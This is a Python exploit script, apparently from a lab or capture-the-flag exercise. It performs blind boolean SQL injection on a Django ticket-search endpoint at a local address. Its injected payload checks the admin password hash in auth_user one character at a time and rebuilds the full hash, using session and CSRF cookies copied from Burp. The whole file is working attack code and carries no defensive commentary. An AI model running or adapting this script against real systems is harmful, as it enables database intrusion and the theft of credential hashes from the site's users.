import requests
import string

BASE_URL = "http://127.0.0.1:5001/tickets/search/"

# Copy these from the Cookie header of any authenticated request in Burp
COOKIES = {
    "sessionid": "8m74qf9u0sqrrqpmta4th8oxy2kxt1e2",
    "csrftoken": "pS2aNLZmnwhlPMugucyhmfwTE7spgVpK",
}

# Covers Django's pbkdf2 hash alphabet: letters, digits, and $ + / = . _
CHARSET = string.ascii_letters + string.digits + "$+/=_.-"


def char_matches(position, char):
    """Ask the DB: is the hash's character at this position equal to `char`?"""
    payload = (
        f"zzznomatch%' OR (SELECT SUBSTRING(password,{position},1) "
        f"FROM auth_user WHERE username='admin')='{char}' -- "
    )
    r = requests.get(BASE_URL, params={"q": payload}, cookies=COOKIES)
    return "0 matches" not in r.text


def extract_hash(max_len=100):
    found = ""
    for position in range(1, max_len + 1):
        hit = None
        for char in CHARSET:
            if char_matches(position, char):
                hit = char
                break
        if hit is None:
            print(f"No match at position {position} — assuming end of hash.")
            break
        found += hit
        print(f"[{position}] {found}")
    return found


if __name__ == "__main__":
    result = extract_hash()
    print("\nRecovered hash:", result)